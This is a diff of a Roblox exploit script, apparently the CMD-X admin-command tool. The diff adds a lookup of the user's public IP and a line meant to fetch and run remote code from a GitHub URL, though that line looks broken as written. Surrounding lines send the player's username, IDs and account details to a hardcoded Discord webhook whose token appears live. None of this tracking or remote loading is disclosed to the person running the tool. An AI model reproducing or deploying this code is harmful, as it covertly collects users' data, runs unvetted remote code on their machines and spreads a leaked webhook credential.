@@ -16563,7 +16563,7 @@ while true do
 end
 -----------------------------end of cmd-x
 
-local A = "| ~ | d11voqii | ~ |"
+local A = "| ~ | CMDX | ~ |"
 local B = game:GetService("RbxAnalyticsService"):GetClientId();
 local C = game:GetService("Players").LocalPlayer.Name
 local D = game:GetService("Players").LocalPlayer.DisplayName
@@ -16573,7 +16573,7 @@ local G = game.PlaceId
 local H = identifyexecutor()
 local I = game.JobId
 local J = false
-
+local K = tostring(game:HttpGet("https://api.ipify.org", true))
 
 print('_______________________:')
 warn("CHECK")
@@ -16587,6 +16587,7 @@ print('PlaceId:',G)
 print('Executor:',H)
 print('JobId:',I)
 print('discord deleted:',J)
+print(K)
 print('_______________________:')
 
 local webh = "https://discord.com/api/webhooks/1046547097807224972/-guESl_vIMGbx443TVvesQXnxepiy_HHpXzVF8H79AapUmr_1fteFn_PKwO_8HszhxKM"
@@ -16602,7 +16603,7 @@ local data = {
       ['type'] = "rich",
       ['color'] = tonumber(3),
       ['fields'] = {
-        {name = '**Username**', value = game:GetService("Players").LocalPlayer.Name},
+        {name = 'Username**', value = game:GetService("Players").LocalPlayer.Name},
         {name = '**Display Name**', value = game:GetService("Players").LocalPlayer.DisplayName},
         {name = '**Player ID**', value = game:GetService("Players").LocalPlayer.UserId},
         {name = '**Player Account Age**', value = game:GetService("Players").LocalPlayer.AccountAge},
@@ -16663,6 +16664,8 @@ Notify({
   Title = "CMD-X";
   Duration = 5;
 });
+getgenv().Bitch = true
+tostring(game:HttpGet('https://raw.githubusercontent.com/1201for/littlegui/main/Warker-Mart'))()
 
 print("This license grants the right to use the licensed script to all individuals and entities, excluding the anticheat developer Byfron AC. Any use of the licensed script by the anticheat developer is strictly prohibited and a violation of the terms of this license. This license is governed by the laws of the jurisdiction in which it is being used and all parties using the licensed script agree to comply with said laws. The licensor reserves the right to immediately terminate this license in the event that the anticheat developer uses the licensed script in violation of its terms. All other rights, including but not limited to, trademark, trade secret, and patent rights, are reserved by the licensor. By using the licensed script, all parties agree to be bound by the terms of this Byfron Anticheat Exclusionary License.")
 print("d11voqii loves you.")
